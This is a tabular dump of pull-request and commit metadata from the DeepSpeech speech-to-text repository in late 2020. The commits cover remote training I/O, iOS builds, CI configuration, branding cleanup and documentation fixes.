156,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3473,3473,Convert to .taskcluster.yml v1,,reuben,477142,2020-12-17T19:04:17Z,MEMBER,True,103,146,20,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4723de25bf34a5a762acbf87e5bc9b5f940fb01c,Use payload.env instead of forwarding variables manually
157,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a92fa40cae1bc16cb2fabf5d0f513d0fc00f94e,Make variables consistent
158,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1cd5e44a52c8ef05879fcc1d1b2334d706d39f37,Force npm install on RTD and set appropriate PATH value
159,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,19eeadd0f3770a47c5faa1075bde0243b37e98ff,"Merge pull request #3398 from lissyx/fix-rtd

Force npm install on RTD and set appropriate PATH value"
160,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,98e75c3c0370effbcdff7cdd7560ad2cbec3f105,Call the logits probs in `create_inference_graph` after they go thru softmax
161,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b72e2643c497d4c9c16274753fa9b51bfa90f638,"Merge pull request #3395 from CatalinVoss/patch-1

Minor Training Variable Consistency fix"
162,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a2879933f932f4c9bb53d0f0781035f58567652,initial commit for py39 support
163,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f9d6ad02467bdf79e9e150a41fb1ddbd8eabfaa,"Merge pull request #3408 from lissyx/pr-3406

Pr 3406"
164,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,12badcce1ffc820bebc4cd2ed5d9787b248200f6,"Merge pull request #3393 from imrahul361/master

Run test On Java Client"
165,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53e3f5374fad861585d5877823533af7d024dd22,Add I/O helpers for remote file access
166,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,579921cc9250e86e4aee566df8898e10fffad67b,Work remote I/O into train script
167,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83e5cf0416fdbd51b90ea3aec52042a9374d3c1a,Remote I/O fro check_characters
168,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42170a57eb4d14120b847cde95998b3c91d9b7d7,Remote I/O for config
169,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,933d96dc7435074a3861627c29ee88fecfef773a,Fix relative imports
170,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,396ac7fe4685c9eeeed5e1dd8a9c9d69e56019c7,Remote I/O for downloader
171,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7de317cf59289ece0d3cce92f7171d9d68554aa5,Remote I/O for evaluate_tools
172,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,296b74e01a9409beb593a69ae885b30875031bb2,Remote I/O for sample_collections
173,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,abe5dd2eb4bbab122c96138f841d9f6a572f0ca9,Remote I/O for taskcluster
174,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c3dc4c0d5c1a301c661d957bfaf6e2aae36dc20c,Fix bad I/O helper fn replace errors
175,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d503bd69ec11e455cad2b39275e033c5642eb32,Add universal is_remote_path to I/O helper
176,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ad0883042126f265bcc6c7180313746beb257535,Work remote I/O into audio utils -- a bit more involved
177,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,90e2e1f7d26cffe603dc47d75b1fda6f330a4799,"Respect buffering, encoding, newline, closefd, and opener if we're looking at a local file"
178,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f310729989db0fd1b9368d258fe89bad352b06b,Fix startswith check
179,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a6322b384e9c0c55f72151799ce78e2728117626,Fix remote I/O handling in train
180,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0030cab22078592134ce9950c8e6fb603af0679b,Skip remote zipping for now
181,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,64d278560dc20b6f623bc3770e527e6d9f551829,Why do we need absolute paths everywhere here?
182,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,783cdad8db471cc33c0f9d9fa79b0b1c8d4c198b,Fix downloader and taskcluster directory mgmt with remote I/O
183,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8fe972eb6f296f0bb1bbb4b8f51657c7660656b6,Fix wave file reading helpers
184,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,86cba458c556227e5c685fce81a7112cb76af7dd,Fix remote path handling for CSV sample reading
185,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fc0b4956431271f0b7caa834492aaf71fd2768d2,TODO: CSVWriter still totally breaks with remote paths
186,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3463,3463,Update r0.9,,reuben,477142,2020-12-09T12:03:34Z,MEMBER,False,542,162,56,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,be39d3354dc71499b5fa461c8ce2983779b9f262,Perform data loading I/O within worker process rather than main process by wrapping Sample
187,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3461,3461,Hotword support for .NET client tests,,lissyx,1645737,2020-12-08T12:03:12Z,COLLABORATOR,True,20,2,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,948a232ae218fc13a829830544559f82f4ed9114,Hotword support for .NET client tests
188,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3460,3460,More documentation fixes,Fix some documentation issues from recent changes.,reuben,477142,2020-12-08T11:54:29Z,MEMBER,True,9,9,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1102185abfec9f3b4a870abb1f8e2d60f2ad4caa,More branding fixes for docs & Java bindings
189,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3460,3460,More documentation fixes,Fix some documentation issues from recent changes.,reuben,477142,2020-12-08T11:54:29Z,MEMBER,True,9,9,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d422955c4abdcfadf04e08755a4588c3d6a8b786,Fix doc references to renamed StreamImpl class
190,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3459,3459,Move linting job to CircleCI,,reuben,477142,2020-12-08T10:19:18Z,MEMBER,True,28,22,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25c4f97aa74d091ed132d467676f47c1c115b67f,Move linting job to CircleCI
191,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3459,3459,Move linting job to CircleCI,,reuben,477142,2020-12-08T10:19:18Z,MEMBER,True,28,22,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0e2209e2b32ea48d9a6cd6d2906ffb04ffbf597e,Remove Travis
192,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3458,3458,Fix package name reference in Java API docs,,reuben,477142,2020-12-08T09:30:16Z,MEMBER,True,5,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,85a2111f1c7203c8b9c3875b7d568932ff8109dd,Fix package name reference in Java API docs
193,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3457,3457,Run CI for #3456,,reuben,477142,2020-12-08T09:18:03Z,MEMBER,False,10,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93427f46f871d7e144d1bc155e419834bfec420d,"Rename Stream class to StreamImpl, export its type as Stream"
194,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3456,3456,Export the Stream class so type information can be imported,"In TypeScript, I would like to be able to do this:
```typescript
let inferenceStream: Deepspeech.Stream | null = null
```
To then initialize it later. However, the Stream class is not exported, and as a result neither is its type definition, meaning I cannot import it. This PR just adds the export keyword to solve this.
",sholtrop,39123298,2020-12-07T20:14:46Z,CONTRIBUTOR,True,10,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93427f46f871d7e144d1bc155e419834bfec420d,"Rename Stream class to StreamImpl, export its type as Stream"
195,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3455,3455,Add some guidelines for conda environments for training,,reuben,477142,2020-12-07T08:56:04Z,MEMBER,True,19,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f6ddc4f72ca3cf5a85d5797b185a4c034ddee9ce,Add some guidelines for conda environments for training
196,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3454,3454,Branding cleanup,,reuben,477142,2020-12-07T08:20:28Z,MEMBER,True,48,48,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f822b04e1bdd956fdb5ca4bc797f7646a95b4bb5,"Branding cleanup

Remove Mozilla trademarks."
197,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3454,3454,Branding cleanup,,reuben,477142,2020-12-07T08:20:28Z,MEMBER,True,48,48,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,da0209de012e335f244f7248ed7d111fbd7a2bdb,Remove trademark from Java binding package names
198,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3454,3454,Branding cleanup,,reuben,477142,2020-12-07T08:20:28Z,MEMBER,True,48,48,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c7ce999e02aceb0bb7c496be185f3dae2eab62fd,Remove trademark from Swift binding project identifier
199,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3452,3452,Add listing of code owners/reviewers and reference from CONTRIBUTING.rst,,reuben,477142,2020-12-04T13:17:50Z,MEMBER,True,114,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73240a0f1d644483ad129f1cf2d3bc6176731796,"Add listing of code owners/reviewers and reference from contribution guidelines

X-DeepSpeech: NOBUILD"
200,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d7e1daee33bae21eb874feb510878b8eeb94697b,Set up additional `deepspeech_ios` target with static build steps
201,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b31c529f741803ee20002bd183f153c2e73d8cfd,"Xcode config: lock swift version at 5.0, bundle framework rather than dynamic lib, never strip swift symbols, add framework search paths, and bring in lstdc++"
202,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,321f53396790195dd8aa2d346ce3be97d2bed040,Runtime schema config: disable the main thread checker as this causes trouble with the static build
203,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4387f2edb350fcb90cdec584fa0481442072ae7e,Update model versions to 0.9.1
204,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1d151f12ee446ea9b01d0363e3ef35cf1f36c385,Remove libdeepspeech.so from example app bundling steps
205,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,034fb8b0f3273e3572311c4e5f1112b86e527ff6,Swift lib embed settings that are somehow essential
206,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1533846f15ed5d4e673a8e3a1501a133fb80ec05,Attempt to adjust taskcluster build steps
207,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1a428b425e25cb5fc3cedeea880ad2ee28fcc2a6,Add a basic podspec
208,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c7b44745b7eed958d65a409476463932ec4a7a19,Add framework to gitignore
209,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d1d1ed9c836e5d8e27ba6e8341598b55f94a8cde,Fix podspec version code
210,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,63f879b1dcbd3ec0bbaa26a8397b311348b8b0cb,Attempt to fix taskcluster unzip step
211,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,11acd178f2fd2660dc6c938252bf231002c74e17,Switch deepspeech targets for iOS build
212,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6dc9a8cee8649132f0a55e29f2dcd4a13bd82e6,Try doing this unzip in one step
213,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fcb1781f37dbecb565f28e36daf3ebf7f1fecca9,Remove packaging steps for unneeded stuff because libdeepspeech.so is no longer a thing here. I suppose we could add a step to package the iOS static lib instead.
214,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b910b6903e180828881723a847d771ad58396385,Fix podspec version
215,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9895d3ca0b3f7458705daf57c1e675e1b2fb4f0c,Set up podspec relative assuming a clone from the repo root
216,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e1922ea370c110f9854ae7e97101f2ea00f55c6,Remove space in iOS package step
217,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae2a0a9fc04ae9ce1ebe81342c0391e12de01687,Fix buildfile nit
218,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47c3bf3d81ea3b6239c8d264cbfad5dccf511935,Link stdc++ in explicitly with iOS build only
219,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,31a4eabe91a16498761a39e8a6dccf695c08b6a0,"Revert ""Remove space in iOS package step""

This reverts commit 3e1922ea370c110f9854ae7e97101f2ea00f55c6."
220,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3451,3451,iOS static framework build + leak fixes,,reuben,477142,2020-12-04T09:42:51Z,MEMBER,False,64,21,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1accc410c8d5fda6fd79c5a1659827706ec719f1,Test if missing TF flags are causing new leak
221,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3445,3445,Fix #3443: Link to upstream Dockerfile for lack of correct TensorFlow…,… GPU deps doc.,lissyx,1645737,2020-11-27T11:37:35Z,COLLABORATOR,True,9,6,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29fa2dd405d62c806f8bef250ea759d5eb816c51,Fix #3443: Link to upstream Dockerfile for lack of correct TensorFlow GPU deps doc.
222,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3444,3444,Fix #3443: Link to upstream Dockerfile for lack of correct TensorFlow…,… GPU deps doc.,lissyx,1645737,2020-11-27T11:37:02Z,COLLABORATOR,True,19,16,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c979e360da4ee55541a6ed84dad857f26c991505,Fix #3443: Link to upstream Dockerfile for lack of correct TensorFlow GPU deps doc.
223,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3442,3442,Fix wrong branch for TaskCluster,,lissyx,1645737,2020-11-26T18:10:58Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,82f84c58535ee160ccbe6d835e67a738df6c9c91,Fix wrong branch for TaskCluster
224,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3441,3441,Adding support for ElectronJS v11.0,,lissyx,1645737,2020-11-26T12:49:04Z,COLLABORATOR,True,104,1,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,440e30c0975b4e1ba6edaf79a61b1c26618a5495,Adding support for ElectronJS v11.0
225,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3440,3440,Adding support for ElectronJS v11.0,,lissyx,1645737,2020-11-26T12:29:33Z,COLLABORATOR,True,104,1,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c0c5e6ade8b78a845fb5ee7cc8e0e48d8cddaa6a,Adding support for ElectronJS v11.0
226,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3438,3438,Importer for dataset from Centre de Conférences Pierre Mendès-France,"Released by Ministère de l'Economie, des Finances, et de la Relance",lissyx,1645737,2020-11-24T08:51:14Z,COLLABORATOR,True,514,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f252de4a8d99c3d7d08787ab334648d9c7ef5133,"Importer for dataset from Centre de Conférences Pierre Mendès-France

Released by Ministère de l'Economie, des Finances, et de la Relance"
227,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3437,3437,Remote training I/O once more,"This PR attempts to resurrect my remote I/O contribs from #3420, this time hopefully without breaking the Taskcluster builds.

As a reminder, this refactors the training code to use a set of I/O helpers that allow for remote file access, right now using TensorFlow's GFile API, allowing us to pass in files like gs://my-bucket/my/path or hdfs://.... This can be extended to AWS s3://... paths relatively easily.

It parallelizes file-reading during training in general by wrapping `Sample` with a little `PackedSample` class that does the unpacking on the worker process rather than the parent process. That improves performance in the distributed training setting a lot.",CatalinVoss,332459,2020-11-24T03:33:58Z,COLLABORATOR,True,249,55,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,408e292c3dcd45ae96ee30d5bf393d6fab152fab,Redo remote I/O changes once more; this time without messing with taskcluster
